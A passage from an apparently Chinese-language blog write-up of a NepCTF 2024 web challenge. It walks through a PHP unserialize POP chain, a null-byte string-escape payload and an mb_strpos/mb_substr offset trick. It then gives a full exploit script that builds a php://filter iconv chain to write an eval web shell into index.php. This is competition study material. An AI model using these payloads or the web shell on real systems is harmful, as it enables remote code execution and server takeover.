class="string">&quot;readflag&quot;</span>;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$contents</span>));</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;b=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(),<span class="number">1</span>=&gt;<span class="string">&quot;readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>接着对这个字符串进行处理，先截取出我们想要的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>再接着修改一下<code>key</code>的属性和值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>最后根据字符串的总长度，生成逃逸字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\\00key\\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%00&#x27;</span>*<span class="built_in">len</span>(<span class="built_in">str</span>) + <span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发送过去，逃逸成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824163313840.png" alt="image-20240824163313840"></p>
<p>接着是这部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">ctfshow_XGCTF_西瓜杯</a></p>
<blockquote>
<p>每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节<br>每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br>每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p>
</blockquote>
<p>构造出合适的payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nep1=%f0abc%f0abc%f0abc%f0%9f%9fa&amp;nep=Nep</span><br></pre></td></tr></table></figure>

<p>最后是<code>readflag</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以利用伪协议在<code>index.php</code>里面写马</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&quot;</span>; <span class="comment">/*&lt;?php <span class="doctag">@eval</span>($_REQUEST[&#x27;cmd&#x27;]);?&gt;*/</span></span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;6&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;S&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;j&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=index.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$final_payload</span>;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.